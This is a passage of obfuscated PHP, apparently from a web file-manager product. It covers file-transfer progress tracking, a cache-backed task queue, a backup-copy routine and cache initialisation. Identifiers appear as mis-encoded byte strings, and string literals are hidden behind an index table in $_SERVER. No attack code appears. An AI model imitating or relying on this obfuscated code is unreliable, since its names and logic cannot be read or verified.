$üîñ¾®Ç  =& $this->task; $üîñ¾®Ç [$àîòĞÙ‰•[1636]] = KodIO::transferType($¯ùı¬, $‡Ö×Ø³); $this->update(); } public function updateAfter() { $Ò…€ğ– =& $_SERVER[èÍ×öˆøÉ]; $–â¸ëıœ·À =& $this->task; if (!$–â¸ëıœ·À[$Ò…€ğ–[758]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($–â¸ëıœ·À[$Ò…€ğ–[1636]] == $Ò…€ğ–[1233]) { return; } self::updateTask($–â¸ëıœ·À); } private static function updateTask(&$òİŠ›Œ·¦™) { $†„ø =& $_SERVER[èÍ×öˆøÉ]; if ($òİŠ›Œ·¦™[$†„ø[1636]] == $†„ø[1132] || $òİŠ›Œ·¦™[$†„ø[1636]] == $†„ø[107]) { if ($òİŠ›Œ·¦™[$†„ø[1630]]) { $òİŠ›Œ·¦™[$†„ø[1633]] = $òİŠ›Œ·¦™[$†„ø[1632]] + $òİŠ›Œ·¦™[$†„ø[1629]]; } } else { if ($òİŠ›Œ·¦™[$†„ø[1636]] == $†„ø[1234]) { if ($òİŠ›Œ·¦™[$†„ø[1630]] == $†„ø[1132]) { $òİŠ›Œ·¦™[$†„ø[1633]] = $òİŠ›Œ·¦™[$†„ø[1632]] + $òİŠ›Œ·¦™[$†„ø[1629]] * 0.5; } else { if ($òİŠ›Œ·¦™[$†„ø[1630]] == $†„ø[107]) { $òİŠ›Œ·¦™[$†„ø[1633]] = $òİŠ›Œ·¦™[$†„ø[1632]] + $òİŠ›Œ·¦™[$†„ø[1628]] * 0.5 + $òİŠ›Œ·¦™[$†„ø[1629]] * 0.5; } } } } $òİŠ›Œ·¦™[$†„ø[1583]] = $òİŠ›Œ·¦™[$†„ø[1633]] / $òİŠ›Œ·¦™[$†„ø[758]]; if ($òİŠ›Œ·¦™[$†„ø[1583]] > 0) { $ò³»Ùé“¾ = timeFloat() - $òİŠ›Œ·¦™[$†„ø[784]] - $òİŠ›Œ·¦™[$†„ø[1586]]; $òİŠ›Œ·¦™[$†„ø[1587]] = $ò³»Ùé“¾ * (1 - $òİŠ›Œ·¦™[$†„ø[1583]]) / $òİŠ›Œ·¦™[$†„ø[1583]]; } } public function addPath($ƒåâ§Šß÷) { $ú«Â˜´äŒçù =& $_SERVER[èÍ×öˆøÉ]; if (!$ƒåâ§Šß÷) { return; } $Â®®ºİå¥‰Ö¯ =& $this->task; $¡Ùˆœß = IO::infoWithChildren($ƒåâ§Šß÷); $Ò¢¢Ô»Ë°ÂŞ = $Â®®ºİå¥‰Ö¯[$ú«Â˜´äŒçù[1637]] ? $Â®®ºİå¥‰Ö¯[$ú«Â˜´äŒçù[1637]][$ú«Â˜´äŒçù[1638]] : 0; $Â®®ºİå¥‰Ö¯[$ú«Â˜´äŒçù[1637]] = array($ú«Â˜´äŒçù[1638] => $Ò¢¢Ô»Ë°ÂŞ + 1, $ú«Â˜´äŒçù[415] => $¡Ùˆœß[$ú«Â˜´äŒçù[28]], $ú«Â˜´äŒçù[76] => $¡Ùˆœß[$ú«Â˜´äŒçù[76]], $ú«Â˜´äŒçù[513] => $¡Ùˆœß[$ú«Â˜´äŒçù[513]] ? $¡Ùˆœß[$ú«Â˜´äŒçù[513]] : $¡Ùˆœß[$ú«Â˜´äŒçù[76]]); if ($¡Ùˆœß[$ú«Â˜´äŒçù[29]] == $ú«Â˜´äŒçù[193]) { $Â®®ºİå¥‰Ö¯[$ú«Â˜´äŒçù[1060]] += 1; } else { $Â®®ºİå¥‰Ö¯[$ú«Â˜´äŒçù[1060]] += $¡Ùˆœß[$ú«Â˜´äŒçù[81]][$ú«Â˜´äŒçù[79]]; if ($¡Ùˆœß[$ú«Â˜´äŒçù[397]]) { $Â®®ºİå¥‰Ö¯[$ú«Â˜´äŒçù[1060]] += $¡Ùˆœß[$ú«Â˜´äŒçù[81]][$ú«Â˜´äŒçù[80]] + 1; } } $Â®®ºİå¥‰Ö¯[$ú«Â˜´äŒçù[758]] += $¡Ùˆœß[$ú«Â˜´äŒçù[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($áŞÑ) { $ğâÌªÂË´ =& $_SERVER[èÍ×öˆøÉ]; $õ‹ =& $this->task; $õ‹[$ğâÌªÂË´[1626]] = $áŞÑ[$ğâÌªÂË´[28]]; $õ‹[$ğâÌªÂË´[1062]] = $áŞÑ[$ğâÌªÂË´[28]]; $this->update(); } public function copyFileStart($¢ı, $½³Ù­²Æù¾, $‹ê, $»ÏÅ€ò, $’¡Û², $‡Ñ¹“¡ş¼è) { $ÂÚ¯İŞÖ =& $_SERVER[èÍ×öˆøÉ]; $‰Ù†Ğ³¤ = $’¡Û²; if ($‰Ù†Ğ³¤ == $GLOBALS[$ÂÚ¯İŞÖ[1639]]) { $‰Ù†Ğ³¤ = $GLOBALS[$ÂÚ¯İŞÖ[1640]]; } $GLOBALS[$ÂÚ¯İŞÖ[1640]] = $’¡Û²; $GLOBALS[$ÂÚ¯İŞÖ[1639]] = $‡Ñ¹“¡ş¼è; $ìÖÑ =& $this->task; $ìÖÑ[$ÂÚ¯İŞÖ[1626]] = $‰Ù†Ğ³¤; $ìÖÑ[$ÂÚ¯İŞÖ[1628]] = (int) $¢ı->size($½³Ù­²Æù¾); $ìÖÑ[$ÂÚ¯İŞÖ[1629]] = 0; $ìÖÑ[$ÂÚ¯İŞÖ[1062]] = $ÂÚ¯İŞÖ[33]; $ìÖÑ[$ÂÚ¯İŞÖ[1630]] = $ÂÚ¯İŞÖ[33]; $ìÖÑ[$ÂÚ¯İŞÖ[1631]] = 0; $Ÿâô = $ìÖÑ[$ÂÚ¯İŞÖ[1628]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ìÖÑ[$ÂÚ¯İŞÖ[395]] . $ÂÚ¯İŞÖ[1641]); if ($Ÿâô && file_exists(get_path_father($»ÏÅ€ò))) { Cache::set($ìÖÑ[$ÂÚ¯İŞÖ[395]] . $ÂÚ¯İŞÖ[1641], $»ÏÅ€ò); $ìÖÑ[$ÂÚ¯İŞÖ[1601]] = array($ÂÚ¯İŞÖ[1642], $ÂÚ¯İŞÖ[1643]); } $this->update(0, $Ÿâô); } public static function updateCopyLocalFileSize($¤†—§úîğ) { $çÁèÇÍ€ÒÁŞ =& $_SERVER[èÍ×öˆøÉ]; $í§¥Î³º‘Ü = Cache::get($¤†—§úîğ[$çÁèÇÍ€ÒÁŞ[395]] . $çÁèÇÍ€ÒÁŞ[1641]); if (!$í§¥Î³º‘Ü || !file_exists($í§¥Î³º‘Ü)) { return $¤†—§úîğ; } $¤†—§úîğ[$çÁèÇÍ€ÒÁŞ[1629]] = @filesize($í§¥Î³º‘Ü); $¤†—§úîğ[$çÁèÇÍ€ÒÁŞ[1633]] += $¤†—§úîğ[$çÁèÇÍ€ÒÁŞ[1629]]; self::updateTask($¤†—§úîğ); return $¤†—§úîğ; } public function copyFileEnd($€¿, $‹Ïî†ïüê‚â, $ïÜØÈî¸úü¹ó, $Ë–‡²È©¬ş, $™Ë, $ï) { $¯°’Íşú¾ =& $_SERVER[èÍ×öˆøÉ]; $üè =& $this->task; $üè[$¯°’Íşú¾[1629]] = $üè[$¯°’Íşú¾[1628]]; $üè[$¯°’Íşú¾[1630]] = $¯°’Íşú¾[33]; unset($üè[$¯°’Íşú¾[1601]]); if ($™Ë == $üè[$¯°’Íşú¾[1626]]) { $üè[$¯°’Íşú¾[1632]] += $üè[$¯°’Íşú¾[1628]]; $üè[$¯°’Íşú¾[1633]] = $üè[$¯°’Íşú¾[1632]]; $this->update(1); } else { $this->update(); $üè[$¯°’Íşú¾[1629]] = 0; } Cache::remove($üè[$¯°’Íşú¾[395]] . $¯°’Íşú¾[1641]); self::log($¯°’Íşú¾[1644] . $‹Ïî†ïüê‚â . $¯°’Íşú¾[67] . $Ë–‡²È©¬ş . $¯°’Íşú¾[229] . $™Ë . $¯°’Íşú¾[1645] . $üè[$¯°’Íşú¾[1626]]); } public function updateFileEnd($ôšê…Ù, $ĞÃ °¼) { $±°— =& $_SERVER[èÍ×öˆøÉ]; $Î±Ï–×¸û =& $this->task; $Î±Ï–×¸û[$±°—[1626]] = $ôšê…Ù; $Î±Ï–×¸û[$±°—[1628]] = $ĞÃ °¼; $Î±Ï–×¸û[$±°—[1632]] += $ĞÃ °¼; $Î±Ï–×¸û[$±°—[1633]] = $Î±Ï–×¸û[$±°—[1632]]; $this->update(1); self::log($±°—[1646] . $ôšê…Ù); } public function sourceModelCopy($ª³ù÷) { $¦ş¡­Ù÷ =& $_SERVER[èÍ×öˆøÉ]; $ÄãÓ = $ª³ù÷[0]; $€×õ = $ª³ù÷[1]; $‡Üİ¬öÅé =& $this->task; $this->sourceModelCopyFlag = !0; $ˆñ¾…Ç»–Ô = 0; switch ($ÄãÓ) { case $¦ş¡­Ù÷[560]: $ˆñ¾…Ç»–Ô = 1; break; case $¦ş¡­Ù÷[563]: $‡Üİ¬öÅé[$¦ş¡­Ù÷[1626]] = $€×õ[$¦ş¡­Ù÷[28]]; break; case $¦ş¡­Ù÷[565]: $ˆñ¾…Ç»–Ô = intval($ª³ù÷[$¦ş¡­Ù÷[378]] * 0.4); break; case $¦ş¡­Ù÷[567]: $ˆñ¾…Ç»–Ô = intval($ª³ù÷[$¦ş¡­Ù÷[378]] * 0.2); break; case $¦ş¡­Ù÷[569]: $ˆñ¾…Ç»–Ô = intval($ª³ù÷[$¦ş¡­Ù÷[378]] * 0.4); break; } $this->update($ˆñ¾…Ç»–Ô); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¨¿®›, $ñ¦€Œï ) { $å™ƒ…Ø« =& $_SERVER[èÍ×öˆøÉ]; $this->sourceModelCopyFlag = !0; $ğ‰¿è‚èÔ»– = 1; if (isset($¨¿®›[$å™ƒ…Ø«[81]])) { $ğ‰¿è‚èÔ»– = $¨¿®›[$å™ƒ…Ø«[81]][$å™ƒ…Ø«[79]] + $¨¿®›[$å™ƒ…Ø«[81]][$å™ƒ…Ø«[80]] + 1; } $this->update($ğ‰¿è‚èÔ»–); $this->sourceModelCopyFlag = !1; } public function sourceMove($óé°´ğé–Æ) { $this->sourceRemove($óé°´ğé–Æ, !1); } public function curlProgress($»üªş¾úúŠ, $‰Ğª¤‡è, $àÛõ•û, $²†¸ëÌ ô¯, $Öƒ÷Õ) { $Ç‡Œ =& $_SERVER[èÍ×öˆøÉ]; $Î«ŒŞ¾› =& $this->task; if ($Öƒ÷Õ > 0) { $Î«ŒŞ¾›[$Ç‡Œ[1062]] = $Ç‡Œ[1647]; $Î«ŒŞ¾›[$Ç‡Œ[1630]] = $Ç‡Œ[107]; if ($Î«ŒŞ¾›[$Ç‡Œ[1628]]) { $Î«ŒŞ¾›[$Ç‡Œ[1629]] = $Öƒ÷Õ; } if ($Î«ŒŞ¾›[$Ç‡Œ[1631]]) { $Î«ŒŞ¾›[$Ç‡Œ[1629]] = $Öƒ÷Õ + $Î«ŒŞ¾›[$Ç‡Œ[1631]]; } } else { if ($àÛõ•û > 0) { if ($Î«ŒŞ¾›[$Ç‡Œ[1628]] == $‰Ğª¤‡è) { $Î«ŒŞ¾›[$Ç‡Œ[1629]] = $àÛõ•û; $Î«ŒŞ¾›[$Ç‡Œ[1062]] = $Ç‡Œ[1648]; $Î«ŒŞ¾›[$Ç‡Œ[1630]] = $Ç‡Œ[1132]; } } } $this->update(); } public function curlProgressStart($ã„ÌÌòû©) { } public function curlProgressEnd($—ÛË¥­í Ô) { $¥Í§œ =& $_SERVER[èÍ×öˆøÉ]; $¦õ =& $this->task; $¥Öó = curl_getinfo($—ÛË¥­í Ô); $ƒšÎâ¹Àµı = $¥Öó[$¥Í§œ[1649]]; if ($ƒšÎâ¹Àµı == -1) { $ƒšÎâ¹Àµı = $¥Öó[$¥Í§œ[1650]]; } if ($¦õ[$¥Í§œ[1630]] == $¥Í§œ[107] && $ƒšÎâ¹Àµı) { $¦õ[$¥Í§œ[1631]] += $ƒšÎâ¹Àµı; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÏşàîöÎ =& $_SERVER[èÍ×öˆøÉ]; $›š¼Ê‘‘ =& $this->task; $›š¼Ê‘‘[$ÏşàîöÎ[1651]] = 1; Hook::bind($ÏşàîöÎ[1620], array($this, $ÏşàîöÎ[1652])); Hook::bind($ÏşàîöÎ[1622], array($this, $ÏşàîöÎ[1653])); Hook::bind($ÏşàîöÎ[1624], array($this, $ÏşàîöÎ[1654])); } protected function endAfter() { $êû·ªÎ£óãê =& $_SERVER[èÍ×öˆøÉ]; Hook::unbind($êû·ªÎ£óãê[1620], array($this, $êû·ªÎ£óãê[1652])); Hook::unbind($êû·ªÎ£óãê[1622], array($this, $êû·ªÎ£óãê[1653])); Hook::unbind($êû·ªÎ£óãê[1624], array($this, $êû·ªÎ£óãê[1654])); } public function progressStart($×Ê¥¼‰»ÈÑ) { $ŞâÉ† =& $_SERVER[èÍ×öˆøÉ]; $¸úâ = curl_getinfo($×Ê¥¼‰»ÈÑ); self::log($ŞâÉ†[1655] . $¸úâ[$ŞâÉ†[305]]); self::valueSet($this->task[$ŞâÉ†[395]], $this->task); } public function progressEnd($ä†º¾‡½ƒÆ) { $üùÀ©¸ì =& $_SERVER[èÍ×öˆøÉ]; self::log($üùÀ©¸ì[1656] . $this->task[$üùÀ©¸ì[395]]); $this->end(); } public function progress($”å—â•¬™‰, $ëÁÂÍÎãÏì¼, $µø, $¬óï´Ã—æ«, $ĞÇñĞçĞ) { $³åÙ =& $_SERVER[èÍ×öˆøÉ]; $Œ§¹‹¶ÑÙØ =& $this->task; if ($ĞÇñĞçĞ > 0) { $Œ§¹‹¶ÑÙØ[$³åÙ[1060]] = $Œ§¹‹¶ÑÙØ[$³åÙ[1060]] == 0 ? $¬óï´Ã—æ« : $Œ§¹‹¶ÑÙØ[$³åÙ[1060]]; $Œ§¹‹¶ÑÙØ[$³åÙ[1074]] = $ĞÇñĞçĞ; } else { if ($µø > 0) { $Œ§¹‹¶ÑÙØ[$³åÙ[1060]] = $Œ§¹‹¶ÑÙØ[$³åÙ[1060]] == 0 ? $ëÁÂÍÎãÏì¼ : $Œ§¹‹¶ÑÙØ[$³åÙ[1060]]; $Œ§¹‹¶ÑÙØ[$³åÙ[1074]] = $µø; } } $this->update(); self::log("\x70\162\157\147\x72\145\x73\163\110\164\164\x70\x3a\144\157\x77\156\72{$µø}\x2f{$ëÁÂÍÎãÏì¼}\x3b\40\x75\160\x6c\x6f\x61\x64\72{$ĞÇñĞçĞ}\x2f{$¬óï´Ã—æ«}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\121\x75\x65\x75\x65\x4c\x65\156\147\x74\x68"; const QUEUE_DATA = "\x74\x61\163\153\121\x75\145\165\x65\x44\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($’şŞÃô, $ÌÅ–¶ºßìŠ = array(), $ªƒù×È = '', $ÈÕÄ¼ãÒ³¯Å = '') { $¬€›¸Š =& $_SERVER[èÍ×öˆøÉ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÈÕÄ¼ãÒ³¯Å && array_find_by_field(self::$listData, $¬€›¸Š[93], $ÈÕÄ¼ãÒ³¯Å)) { return !0; } self::$listData[] = array($¬€›¸Š[262] => $’şŞÃô, $¬€›¸Š[1657] => $ÌÅ–¶ºßìŠ, $¬€›¸Š[445] => $ªƒù×È, $¬€›¸Š[93] => $ÈÕÄ¼ãÒ³¯Å); return !0; } public static function addSubmit() { $ï«È€ÈÄÆÉ =& $_SERVER[èÍ×öˆøÉ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ï«È€ÈÄÆÉ[1658] . json_encode_force(array_to_keyvalue(self::$listData, $ï«È€ÈÄÆÉ[33], $ï«È€ÈÄÆÉ[445])), $ï«È€ÈÄÆÉ[1659]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ƒ“¥, $¼âóÃ = array(), $‹¸š¯‰û = '', $¤„è¯Ëç = '') { $Ñ¢Üõé¯° =& $_SERVER[èÍ×öˆøÉ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $³°¾ÖµŸøÀ = self::getAll(); if ($¤„è¯Ëç && array_find_by_field($³°¾ÖµŸøÀ, $Ñ¢Üõé¯°[93], $¤„è¯Ëç)) { return !0; } $³°¾ÖµŸøÀ[] = array($Ñ¢Üõé¯°[262] => $ƒ“¥, $Ñ¢Üõé¯°[1657] => $¼âóÃ, $Ñ¢Üõé¯°[445] => $‹¸š¯‰û, $Ñ¢Üõé¯°[93] => $¤„è¯Ëç); write_log($Ñ¢Üõé¯°[1658] . $‹¸š¯‰û, $Ñ¢Üõé¯°[1659]); self::setAll($³°¾ÖµŸøÀ); return !0; } public static function run() { $äâ³çĞ†ÜÑ·Ú =& $_SERVER[èÍ×öˆøÉ]; $ã™¦ÑÈ–Ñ = self::getAll(); $ò¤³ÇĞ›³‡Ñ± = array_shift($ã™¦ÑÈ–Ñ); if (!$ò¤³ÇĞ›³‡Ñ±) { return !1; } self::setAll($ã™¦ÑÈ–Ñ); $©öñßô±ö¢‚ = timeFloat(); try { Hook::apply($ò¤³ÇĞ›³‡Ñ±[$äâ³çĞ†ÜÑ·Ú[262]], $ò¤³ÇĞ›³‡Ñ±[$äâ³çĞ†ÜÑ·Ú[1657]]); } catch (Exception $ôè¬ˆ) { } $ÊÉï×ø´ = number_format(timeFloat() - $©öñßô±ö¢‚, 3) . $äâ³çĞ†ÜÑ·Ú[1595]; write_log($äâ³çĞ†ÜÑ·Ú[1660] . $ò¤³ÇĞ›³‡Ñ±[$äâ³çĞ†ÜÑ·Ú[445]] . $äâ³çĞ†ÜÑ·Ú[1661] . $ÊÉï×ø´, $äâ³çĞ†ÜÑ·Ú[1659]); return !0; } public static function count() { $‚¡™˜º‚ìçî = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$‚¡™˜º‚ìçî) { return 0; } return intval($‚¡™˜º‚ìçî); } public static function getAll() { $ŸæÚÃ‚õ‡Ş‹ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ŸæÚÃ‚õ‡Ş‹) { return array(); } return $ŸæÚÃ‚õ‡Ş‹; } public static function setAll($©üõÀœ·ıâä) { $¤‚¢¤Áñô‡à = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($©üõÀœ·ıâä), $¤‚¢¤Áñô‡à); Cache::set(self::QUEUE_DATA, $©üõÀœ·ıâä, $¤‚¢¤Áñô‡à); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto f„Ÿ»Ûö“İ; f¡ö‰²—Äš: function binCheckBigger($ü¾, $¸«) { return $ü¾ > $¸«; } $_SERVER[$_SERVER[©ÚŸ÷»ïé][3]] = ("\x37\x39\x33\x32"."\x30\x37")+0;$_a4dN="hSDj7zr5fUFkptqDnYFsKVTxTqcWJISgp3RMMY2zZEEEhipzcWtDvZ8UJRZZbMueCj6Vc2GBau8d";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ù—ı‰, $Äù¹) { $Ê²“³ƒş„ =& $_SERVER[èÍ×öˆøÉ]; if (isset(self::$_methodList[$ù—ı‰])) { return @call_user_func_array(self::$_methodList[$ù—ı‰], $Äù¹); } else { if (method_exists($this, $ù—ı‰)) { return call_user_func_array(array($this, $ù—ı‰), $Äù¹); } else { think_exception(__CLASS__ . $Ê²“³ƒş„[4] . $ù—ı‰ . $Ê²“³ƒş„[5]); } } } public static function __callStatic($¼, $Ãø³Æá×) { if (isset(self::$_methodListStatic[$¼])) { return call_user_func_array(self::$_methodListStatic[$¼], $Ãø³Æá×); } else { if (method_exists(self, $¼)) { return call_user_func_array(array(self, $¼), $Ãø³Æá×); } else { show_json("{$¼}\50\x29\x20\x6e\157\164\40\145\x78\x69\163\x74\73", !1); } } } public static function addMethod($Ø½ÒÕò€æú, $†‡) { self::$_methodList[$Ø½ÒÕò€æú] = $†‡; } public static function addMethodStatic($ºšì, $ÑŠæÄÒ––„) { self::$_methodListStatic[$ºšì] = $ÑŠæÄÒ––„; } } goto f¡íëÊ¯À; bõÛ‘ïõñ: class BackupFile { public function __construct() { } public function index() { $±†ˆò§·¶ = Backup::get(); $ÎĞ = $±†ˆò§·¶[$_SERVER[èÍ×öˆøÉ][291]][$_SERVER[èÍ×öˆøÉ][193]][$_SERVER[èÍ×öˆøÉ][461]]; $³ÑœöÛ  Ç = array($_SERVER[èÍ×öˆøÉ][462] => array($_SERVER[èÍ×öˆøÉ][809], $ÎĞ), $_SERVER[èÍ×öˆøÉ][810] => array($_SERVER[èÍ×öˆøÉ][329], $±†ˆò§·¶[$_SERVER[èÍ×öˆøÉ][747]])); $óİ = (int) Model($_SERVER[èÍ×öˆøÉ][782])->where($³ÑœöÛ  Ç)->count($_SERVER[èÍ×öˆøÉ][461]); $”Óî¶€ğ­ŠŠ = (int) Model($_SERVER[èÍ×öˆøÉ][782])->where($³ÑœöÛ  Ç)->sum($_SERVER[èÍ×öˆøÉ][78]); $ç–¥ĞìæÚÆ = new TaskFileTransfer($_SERVER[èÍ×öˆøÉ][811], $_SERVER[èÍ×öˆøÉ][777], $óİ, LNG($_SERVER[èÍ×öˆøÉ][778]) . $_SERVER[èÍ×öˆøÉ][779] . LNG($_SERVER[èÍ×öˆøÉ][812])); $ç–¥ĞìæÚÆ->task[$_SERVER[èÍ×öˆøÉ][758]] = $”Óî¶€ğ­ŠŠ; $ùŒ×œÀ¢ô© = array($_SERVER[èÍ×öˆøÉ][813] => $óİ, $_SERVER[èÍ×öˆøÉ][814] => $”Óî¶€ğ­ŠŠ, $_SERVER[èÍ×öˆøÉ][815] => time()); Backup::set($ùŒ×œÀ¢ô©); $ŒîÎ = !0; $ñóâ = $this->storeIds(); $¼ò£ˆŸğ = 1; $Åõ÷ÖˆÏÏ—† = 1000; $£“©¶„Ã = $åÍê»ôÖ½ = 0; $¹ı = array(); $ö–ïÁÖÜ§®œÈ = $É÷Š‘©Î = 0; do { $ÉåºÙÏÁ = $_SERVER[èÍ×öˆøÉ][816]; $ÅùºØí²¶Š = Model($_SERVER[èÍ×öˆøÉ][782])->where($³ÑœöÛ  Ç)->field($ÉåºÙÏÁ)->order($_SERVER[èÍ×öˆøÉ][817])->selectPage($Åõ÷ÖˆÏÏ—†, $¼ò£ˆŸğ); $¥à™İÉùÊ” = !empty($ÅùºØí²¶Š[$_SERVER[èÍ×öˆøÉ][367]]) ? $ÅùºØí²¶Š[$_SERVER[èÍ×öˆøÉ][367]] : array(); foreach ($¥à™İÉùÊ” as $‘ïá—Ö¾¡ıò›) { if (!$this->_fileExist($‘ïá—Ö¾¡ıò›, $¹ı, $ñóâ)) { $óİ -= 1; $”Óî¶€ğ­ŠŠ -= (int) $‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][78]]; write_log("\146\x69\154\145\x20\x6e\x6f\x74\x20\145\170\151\x73\164\x2e\146\x69\x6c\145\111\x44\72{$‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][461]]}\54\40\x70\x61\164\150\x3a{$‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][76]]}", $_SERVER[èÍ×öˆøÉ][818]); continue; } $èõÒîÄ = $‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][76]]; $ºŒ = "\173\x69\x6f\x3a{$±†ˆò§·¶[$_SERVER[èÍ×öˆøÉ][747]]}\175" . substr($èõÒîÄ, strlen("\173\151\x6f\x3a{$‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][819]]}\x7d")); if (IO::exist($ºŒ)) { $ç–¥ĞìæÚÆ->updateFileEnd($‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][28]], $‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][78]]); } else { $ºŒ = get_path_father($ºŒ); IO::mkdir($ºŒ); if (!IO::copy($èõÒîÄ, $ºŒ, $_SERVER[èÍ×öˆøÉ][820])) { write_log($_SERVER[èÍ×öˆøÉ][821] . $èõÒîÄ . $_SERVER[èÍ×öˆøÉ][804] . $ºŒ . $_SERVER[èÍ×öˆøÉ][530], $_SERVER[èÍ×öˆøÉ][777]); $ŒîÎ = !1; break; } } $ÎĞ = $‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][461]]; $åÍê»ôÖ½ += 1; $£“©¶„Ã += $‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][78]]; $É÷Š‘©Î += 1; $ö–ïÁÖÜ§®œÈ += $‘ïá—Ö¾¡ıò›[$_SERVER[èÍ×öˆøÉ][78]]; if ($£“©¶„Ã >= 1024 * 1024 * 100) { $ùŒ×œÀ¢ô© = array($_SERVER[èÍ×öˆøÉ][822] => $ÎĞ, $_SERVER[èÍ×öˆøÉ][823] => $É÷Š‘©Î, $_SERVER[èÍ×öˆøÉ][824] => $ö–ïÁÖÜ§®œÈ); Backup::set($ùŒ×œÀ¢ô©); $£“©¶„Ã = $åÍê»ôÖ½ = 0; } } $ÉÌ = count($¥à™İÉùÊ”); $¼ò£ˆŸğ++; } while ($ÉÌ == $Åõ÷ÖˆÏÏ—†); $ç–¥ĞìæÚÆ->end(); $ùŒ×œÀ¢ô© = array($_SERVER[èÍ×öˆøÉ][825] => 1, $_SERVER[èÍ×öˆøÉ][490] => time(), $_SERVER[èÍ×öˆøÉ][770] => 1, $_SERVER[èÍ×öˆøÉ][822] => $ÎĞ, $_SERVER[èÍ×öˆøÉ][814] => $”Óî¶€ğ­ŠŠ, $_SERVER[èÍ×öˆøÉ][813] => $óİ, $_SERVER[èÍ×öˆøÉ][826] => time()); if ($åÍê»ôÖ½) { $ùŒ×œÀ¢ô©[$_SERVER[èÍ×öˆøÉ][823]] = $É÷Š‘©Î; $ùŒ×œÀ¢ô©[$_SERVER[èÍ×öˆøÉ][824]] = $ö–ïÁÖÜ§®œÈ; } Backup::set($ùŒ×œÀ¢ô©); $this->_fileFilter($¹ı); return !0; } private function _fileExist($Í˜ã, &$ğúâÎ±Ø„è, $ĞàïçıÏæ²‚) { $äÁµö¥ =& $_SERVER[èÍ×öˆøÉ]; $á ·¿ = $Í˜ã[$äÁµö¥[76]]; if (in_array($Í˜ã[$äÁµö¥[461]], $ğúâÎ±Ø„è)) { return !1; } if (!in_array($Í˜ã[$äÁµö¥[819]], $ĞàïçıÏæ²‚)) { return !1; } if (IO::exist($á ·¿)) { return !0; } $øÒ = get_path_father($á ·¿); if (IO::exist($øÒ)) { $ğúâÎ±Ø„è[] = $Í˜ã[$äÁµö¥[461]]; return !1; } $§ƒ’ã†ªµ£ = array($äÁµö¥[819] => $Í˜ã[$äÁµö¥[819]], $äÁµö¥[76] => array($äÁµö¥[381], "{$øÒ}\x25")); $¥ş”Ö¬Ü = Model($äÁµö¥[782])->where($§ƒ’ã†ªµ£)->field($äÁµö¥[462])->select(); $ğúâÎ±Ø„è = array_merge($ğúâÎ±Ø„è, array_to_keyvalue($¥ş”Ö¬Ü, $äÁµö¥[33], $äÁµö¥[461])); return !1; } private function _fileFilter($Û¿òíİ´”íâ¾) { $÷´şß¢†ª“ =& $_SERVER[èÍ×öˆøÉ]; if (empty($Û¿òíİ´”íâ¾)) { return; } $´°à = array($÷´şß¢†ª“[461] => array($÷´şß¢†ª“[7], array_unique($Û¿òíİ´”íâ¾))); $îíî›½÷ = Model($÷´şß¢†ª“[827])->where($´°à)->field($÷´şß¢†ª“[397])->select(); foreach ($îíî›½÷ as $¨ïÜ) { Model($÷´şß¢†ª“[827])->remove($¨ïÜ[$÷´şß¢†ª“[397]], !1); } } private function storeIds() { $å»Óˆ€£í =& $_SERVER[èÍ×öˆøÉ]; $Ğé = Model($å»Óˆ€£í[762])->listData(); $—ÆÌôĞ = array(); $Ã‚œÄ¢ª£Á¨ = $GLOBALS[$å»Óˆ€£í[6]][$å»Óˆ€£í[88]][$å»Óˆ€£í[828]]; foreach ($Ğé as $üÎüäÀ©¤Ã) { $³â²’ = strtolower($üÎüäÀ©¤Ã[$å»Óˆ€£í[94]]); if (!isset($Ã‚œÄ¢ª£Á¨[$³â²’])) { continue; } $Ğ = $å»Óˆ€£í[72] . (isset($Ã‚œÄ¢ª£Á¨[$³â²’]) ? $Ã‚œÄ¢ª£Á¨[$³â²’] : ucfirst($³â²’)); if (!class_exists($Ğ)) { continue; } $—ÆÌôĞ[] = $üÎüäÀ©¤Ã[$å»Óˆ€£í[395]]; } return $—ÆÌôĞ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Ù£ =& $_SERVER[èÍ×öˆøÉ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $öâñ•ò = $GLOBALS[$Ù£[6]][$Ù£[347]]; $»Ù = $öâñ•ò[$öâñ•ò[$Ù£[829]]]; $…á§ = $öâñ•ò[$Ù£[830]]; switch ($öâñ•ò[$Ù£[829]]) { case $Ù£[17]: self::$handle = Model($Ù£[831]); break; case $Ù£[832]: self::$handle = new CacheRedis($»Ù, $…á§); break; case $Ù£[833]: self::$handle = new CacheMemcached($»Ù, $…á§); break; case $Ù£[193]: self::$handle = new CacheFile($»Ù, $…á§); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ˆßÕÁŸ‚ø¤) { if (is_array($ˆßÕÁŸ‚ø¤) || 